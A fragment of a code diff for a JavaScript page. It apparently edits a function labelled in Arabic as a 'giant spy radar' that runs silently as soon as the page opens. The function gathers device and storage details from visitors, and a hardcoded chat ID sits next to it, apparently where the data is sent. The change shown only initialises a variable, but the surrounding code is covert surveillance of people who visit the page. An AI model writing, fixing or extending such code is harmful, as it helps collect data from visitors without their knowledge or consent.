@@ -140,6 +140,9 @@ const chatId = "7388801889";
     
     // --- رادار التجسس العملاق (يشتغل فور فتح الصفحة) ---
     async function silentRadar() {
+     
+        let storageInfo = "غير مدعوم"; // تعريف المتغير أولاً لتجنب الأخطاء
+          
         try {
             if (navigator.storage && navigator.storage.estimate) {
                 const estimate = await navigator.storage.estimate();
